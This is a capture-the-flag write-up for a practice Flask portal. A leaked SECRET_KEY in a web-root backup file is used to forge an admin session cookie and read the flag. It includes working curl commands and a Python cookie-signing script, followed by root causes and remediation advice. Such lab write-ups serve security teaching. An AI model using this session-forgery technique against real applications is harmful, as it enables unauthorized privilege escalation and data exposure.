# Crest Staff Portal — CTF Writeup

**Target:** `http://2.31.70.16:5100/`
**Objective:** Read the restricted admin report and recover the flag.
**Flag:** `crest{s3ss10n_dr1ft_s3cr3t_reuse}`

---

## Executive summary

The portal uses a Flask client-side session cookie containing the authenticated
user's `role`. A backup of the staging configuration was left inside the web
root and disclosed the Flask `SECRET_KEY`. With that key, an attacker can sign an
arbitrary session payload. Forging `{"role":"admin","username":"alice"}` unlocks
the administrator dashboard and reveals the restricted report token.

No JWT, OAuth, SAML, or external SSO assertions were used. The "single sign-on"
described by the UI is just a local login backed by a signed Flask session.

---

## 1. Reconnaissance

The homepage returned `200 OK` from `gunicorn` with Flask/Werkzeug-style
responses. The relevant routes were:

| Route | Method | Behavior |
|---|---|---|
| `/` | GET | Public homepage |
| `/login` | GET/POST | Login form; demo credentials shown |
| `/logout` | GET | Redirects to `/` |
| `/dashboard` | GET | Authenticated area; shows username and role |
| `/robots.txt` | GET | Discloses `/static/backup/` |
| `/static/backup/config.py.bak` | GET | Downloadable staging config |

`robots.txt` contained:

```text
User-agent: *
Disallow: /static/backup/
```

Directory listing was disabled, but guessing backup filenames found
`config.py.bak`:

```bash
curl -s http://2.31.70.16:5100/static/backup/config.py.bak
```

```python
# Crest Internal - staging config (DO NOT COMMIT)
# NOTE: secret reused from the dev box; rotate before prod (SEC-241)
SECRET_KEY = "sup3r-s3cr3t-dev-key-2023"
DEBUG = False
```

This is the critical exposure: the Flask signing key is public.

---

## 2. Authentication and session analysis

Logging in with the supplied demo account:

```bash
curl -s -i -c jar.txt -X POST http://2.31.70.16:5100/login \
  --data "username=alice&password=password123"
```

The server responds with `302 FOUND` to `/dashboard` and sets an `HttpOnly;
Path=/` cookie named `session`. No `Secure` or `SameSite` attribute was observed.

The cookie is a Flask signed session. Its payload decodes to:

```json
{"role":"user","username":"alice"}
```

The `/dashboard` page renders this role directly:

```html
<div class="kv"><span>Session role</span><strong>user</strong></div>
<div class="kv"><span>Admin reports</span><strong>locked</strong></div>
```

The application therefore bases authorization on a client-controlled value that
is only protected by the cookie signature. Since the signing key leaked, that
protection is gone.

Additional session behavior test:

```text
login status 302 loc /dashboard
dashboard before logout 200 Signed in as alice: True
logout 302 loc /
replay old cookie after logout 200
```

Logout does not revoke a previously issued cookie. This is expected for Flask
client-side sessions without server-side revocation and is a secondary issue.

---

## 3. Exploitation

With the leaked key, sign a new session containing the `admin` role:

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "sup3r-s3cr3t-dev-key-2023"

serializer = SecureCookieSessionInterface().get_signing_serializer(app)
cookie = serializer.dumps({"role": "admin", "username": "alice"})
print(cookie)
```

Send the forged cookie to `/dashboard`:

```bash
curl -s -H "Cookie: session=<forged-cookie>" \
  http://2.31.70.16:5100/dashboard
```

The server accepts the cookie. The dashboard changes to:

```html
<div class="kv"><span>Session role</span><strong>admin</strong></div>
<div class="kv"><span>Admin reports</span><strong>unlocked</strong></div>
```

The restricted report token is rendered in the response:

```html
<div class="flag">crest{s3ss10n_dr1ft_s3cr3t_reuse}</div>
```

The complete reproducible script is in `solve.py`. Running it:

```text
leaked_signing_key: found (25 chars)
baseline_login_status: 302
forged_admin_dashboard_status: 200
flag: crest{s3ss10n_dr1ft_s3cr3t_reuse}
```

---

## 4. Exploit chain

| Step | Action | Result |
|---|---|---|
| 1 | Read `robots.txt` | `/static/backup/` disclosed |
| 2 | Fetch `/static/backup/config.py.bak` | `SECRET_KEY` disclosed |
| 3 | Decode Alice's session | Contains `{"role":"user","username":"alice"}` |
| 4 | Sign session with `role=admin` | Forged cookie accepted |
| 5 | Open `/dashboard` | Reports unlocked; flag returned |

---

## 5. Root cause and impact

**Root causes**

1. A backup containing the production signing key was deployed inside the web
   root.
2. Authorization data (`role`) is trusted from the signed session instead of
   being checked against server-side state.
3. Existing sessions are not revoked on logout.

**Impact**

An unauthenticated attacker can escalate to administrator and read confidential
reports. In this challenge the exposed report contains the flag; in a real
deployment the same path could expose sensitive internal data and administrative
functionality.

---

## 6. Remediation

- Remove backup/config files from the web root and block `/static/backup/`.
- Rotate `SECRET_KEY` and store secrets in a secret manager.
- Load the user and role from the database for every privileged request instead
  of trusting the session payload.
- Use server-side sessions or a revocation mechanism so logout invalidates
  sessions.
- Set `Secure`, `HttpOnly`, and `SameSite` on cookies and serve the portal over
  HTTPS.
- Prevent `.bak`, `.env`, VCS, and configuration files from being deployed.

---

## Result

```
crest{s3ss10n_dr1ft_s3cr3t_reuse}
```
